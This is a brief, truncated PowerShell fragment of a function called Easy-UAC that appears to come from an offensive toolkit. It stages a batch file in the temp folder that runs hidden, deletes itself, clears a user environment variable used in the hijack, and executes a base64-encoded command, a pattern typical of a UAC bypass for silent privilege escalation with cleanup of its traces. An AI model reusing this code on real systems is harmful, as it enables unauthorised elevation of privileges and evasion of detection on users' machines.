function Easy-UAC {
	...
	$Path = $env:TEMP + '\A.bat'
	$Value = "powershell $hide -c '';Clear-Host;Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User);powershell ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')))"
